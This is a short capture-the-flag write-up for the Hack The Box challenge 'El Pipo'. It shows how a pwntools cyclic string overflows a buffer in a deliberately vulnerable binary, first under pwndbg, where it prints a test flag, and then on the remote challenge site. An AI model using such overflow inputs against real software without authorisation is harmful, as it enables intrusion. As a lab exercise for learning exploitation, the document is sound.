---
title: "El Pipo - HTB Very Easy Challenge | Buffer Overflow"
description: "Walkthrough for El Pipo challenge from Hack The Box. A very easy pwn challenge involving a simple buffer overflow that directly reveals the flag without requiring ROP chains or address manipulation."
author: dua2z3rr
date: 2026-02-25 3:00:00
categories:
  - HackTheBox
  - Challenges
tags: ["pwn"]
---

## Challenge Overview

An ancient spirit, El Pipo, has taken control of this place. Face your fears and try to drive it away with your most vicious scream!

---

## Solution

### Local Analysis with GDB

Download the files and run the el_pipo binary with gdb.

Using this command, we create a string formed by various 4-character strings that never repeat:

```shell
[Feb 25, 2026 - 15:16:22 (CET)] exegol-main /workspace # pwn cyclic 80  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
```

In gdb, we run the program and paste the string. A buffer overflow occurs and we don't even need to specify another memory address for the return address - we directly obtain the flag we have locally for testing:

```shell
pwndbg> r  
Starting program: /workspace/challenges/El Pipo/challenge/el_pipo  
warning: Expected absolute pathname for libpthread in the inferior, but got ./glibc/libc.so.6.  
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa  
HTB{f4ke_fl4g_4_t35t1ng}  
  
Program received signal SIGSEGV, Segmentation fault.
```

### Remote Exploitation

We open the website and paste the string we generated with cyclic to obtain the flag:

![flag](assets/img/El-Pipo/flag.png)

**Flag obtained.**
